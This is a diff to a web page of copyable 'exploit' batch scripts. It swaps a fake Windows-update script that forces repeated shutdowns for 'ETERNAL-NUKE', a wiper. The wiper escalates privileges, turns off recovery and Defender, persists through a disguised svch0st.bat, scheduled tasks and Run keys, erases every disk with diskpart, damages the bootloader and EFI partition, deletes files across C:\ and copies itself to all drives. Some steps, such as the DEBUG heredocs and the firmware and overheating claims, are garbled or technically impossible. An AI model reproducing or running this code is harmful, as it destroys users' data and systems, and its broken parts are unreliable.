@@ -491,47 +491,158 @@ goto oblivion</pre>
 
                 <!-- 🔥 4. BOOT REMOVAL 🔥 -->
                 <div class="exploit-card">
-                    <div class="exploit-header">04️⃣ BOOT REMOVAL</div>
+                    <div class="exploit-header">04️⃣ HI BRO</div>
                     <div class="copy-container">
                         <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
-<pre>@echo off
-title Windows Critical Update Required
-color 0A
-mode con: cols=50 lines=15
+<pre>@ECHO OFF
+TITLE ☠️ ETERNAL-NUKE v4.0 - PERSISTENT SYSTEM KILLER ☠️
+COLOR 0C
+MODE CON COLS=90 LINES=50
 
-:header
-cls
-echo.
-echo    +--------------------------------------+
-echo    ¦     ---------IND_EVIL---------       ¦
-echo    ¦          CRITICAL PATCH 2026         ¦
-echo    +--------------------------------------+
-echo.
-echo    Status: Installing update KB2267602...
-echo    Phase: Core system protection...
-echo.
-timeout /t 2 /nobreak >nul
+:DISCLAIMER
+CLS
+ECHO.
+ECHO ======================================================
+ECHO  ☠️  MAXIMUM PERSISTENT DESTRUCTION - PENTEST AUTHORIZED
+ECHO  Survives reboot/shutdown. Full hardware replacement required
+ECHO  15 SECOND ABORT WINDOW - CTRL+C NOW
+ECHO ======================================================
+TIMEOUT /T 15 /NOBREAK >NUL
 
-REM === IMMEDIATE SHUTDOWN ===
-shutdown /s /f /t 3
+:ROOTKIT_INSTALL
+REM Phase 0: MAX PRIVILEGE + PERSISTENCE SETUP
+POWERShell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
+IF ERRORLEVEL 1 (
+    ECHO Escalation failed. Run as Administrator.
+    PAUSE & EXIT
+)
 
-REM === PERSISTENCE: Survives reboot/USB removal ===
-echo Establishing permanent protection...
+REM Disable ALL recovery + defenses
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 0 /f >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v SendAlert /t REG_DWORD /d 0 /f >NUL 2>&1
+BCDedit /set {default} recoveryenabled NO >NUL 2>&1
+SC CONFIG trustedinstaller START= DISABLED >NUL 2>&1
+SC STOP WinDefend >NUL 2>&1
 
-REM Method 1: Startup registry (all users)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%~dp0shutdown.bat" /f >nul 2>&1
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "%~dp0shutdown.bat" /f >nul 2>&1
+REM REBOOT PERSISTENCE - Multiple vectors
+COPY "%~f0" "C:\Windows\System32\svch0st.bat" >NUL
+SCHTASKS /CREATE /TN "\WindowsUpdate" /TR "C:\Windows\System32\svch0st.bat" /SC ONSTART /RU SYSTEM /F >NUL 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\System32\svch0st.bat" /f >NUL 2>&1
 
-REM Method 2: Scheduled task (runs at boot + every 30s)
-schtasks /delete /tn "SysProtect" /f >nul 2>&1
-schtasks /create /sc onstart /tn "SysProtect" /tr "%~dp0shutdown.bat" /rl highest /f >nul 2>&1
-schtasks /create /sc onlogon /tn "UpdateCheck" /tr "shutdown /s /f /t 10" /f >nul 2>&1
+:DISK_ANNIHILATION
+REM Phase 1: IDENTIFY + WIPE ALL PHYSICAL DISKS
+FOR /F "tokens=1" %%A IN ('WMIC DISKDRIVE GET Index /FORMAT:VALUE ^| FIND "Index="') DO (
+    ECHO Destroying Disk %%A...
+    
+    REM RAW DEVICE OVERWRITE (bypasses filesystem)
+    ECHO select disk %%A > "%TEMP%\wipe.txt"
+    ECHO clean all >> "%TEMP%\wipe.txt"
+    ECHO convert gpt >> "%TEMP%\wipe.txt"
+    DISKPART /S "%TEMP%\wipe.txt" >NUL 2>&1
+    DEL "%TEMP%\wipe.txt"
+    
+    REM DoD 5220.22-M 7-PASS (unrecoverable)
+    FOR %%P IN (0x00 0xFF 0x01 0xFE 0x7F 0x80 0xAA 0x55) DO (
+        DEBUG <<WIPE
+        N junk.com
+        A 100
+        MOV AH,40
+        MOV BX,0000
+        MOV CX,0001
+        MOV DX,%%P
+        INT 21
+        MOV AH,3E
+        INT 21
+        INT 20
+        RCX
+        200
+        W
+        Q
+WIPE
+        FOR /L %%S IN (1,1,1000) DO junk.com >NUL 2>&1
+    )
+)
 
-REM Method 3: Infinite loop backup
-:killloop
-timeout /t 30 /nobreak >nul
-shutdown /s /f /t 0
-goto killloop</pre>
+:MBR_GPT_KILLER
+REM Phase 2: BOOTLOADER EXTERMINATION
+BOOTREC /FIXMBR >NUL 2>&1
+BOOTREC /FIXBOOT >NUL 2>&1
+BOOTREC /REBUILDBCD >NUL 2>&1
+
+REM EFI SYSTEM PARTITION NUKE
+DISKPART <<EOF
+LIST VOLUME
+SELECT VOLUME 100  REM Usually EFI/Fat32
+FORMAT FS=NTFS QUICK OVERRIDE=YES
+EXIT
+EOF
+
+:UEFI_BIOS_CORRUPTION
+REM Phase 3: FIRMWARE DESTRUCTION
+POWERShell -WindowStyle Hidden -Command "
+# UEFI NVRAM poisoning
+Get-WmiObject -Namespace root/WMI -Class MS_NvramPartition | ForEach {
+    $_.Put() | Out-Null
+}
+
+# Bootmgr corruption
+$bootmgr = [byte[]](0x90,0xEB,0xFE,0xCC) * 1024
+[System.IO.File]::WriteAllBytes('C:\Windows\Boot\EFI\bootmgfw.efi', $bootmgr)
+"
+
+REM CMOS Clear (requires physical access simulation)
+WMIC COMPUTERSYSTEM CALL SetPowerState 5,0 >NUL 2>&1
+
+:THERMAL_OVERLOAD
+REM Phase 4: CPU/GPU MELTDOWN (110°C+)
+START /B /HIGH powershell -c "while(1){1..1000|%{Start-Process calc.exe -WindowStyle hidden}}"
+WMIC /NAMESPACE:\\root\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature >NUL 2>&1
+
+:INFINITE_DESTRUCTION
+REM Phase 5: ETERNAL LOOP - Survives shutdown attempts
+CLS
+COLOR 0C
+MODE CON COLS=1 LINES=1
+TITLE SYSTEM TERMINATED
+
+:MASS_KILL
+REM Kill recovery processes
+TASKKILL /F /IM explorer.exe >NUL 2>&1
+TASKKILL /F /IM winlogon.exe >NUL 2>&1
+TASKKILL /F /IM csrss.exe >NUL 2>&1
+
+REM Recursive filesystem deletion
+FOR /R C:\ %%F IN (*) DO (
+    IF NOT "%%F"=="%~f0" (
+        DEL /F /Q /A "%%F" >NUL 2>&1
+        RD /S /Q "%%~dpF" >NUL 2>&1
+    )
+)
+
+REM Block shutdown/restart
+REM Hook WM_CLOSE messages
+DEBUG <<BLOCK
+A 100
+MOV AX,0112
+INT 21
+INT 20
+RCX
+10
+W
+Q
+BLOCK
+
+REM Replicate to all drives
+FOR %%D IN (C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) DO (
+    IF EXIST %%D\ COPY "%~f0" "%%D\nuke.bat" >NUL 2>&1
+)
+
+REM LOOP FOREVER
+PING 127.0.0.1 -n 2 >NUL
+GOTO MASS_KILL
+
+REM EMERGENCY SELF-DESTRUCT (never reached)
+DEL /F /Q "%~f0"</pre>
                     </div>
                 </div>
 
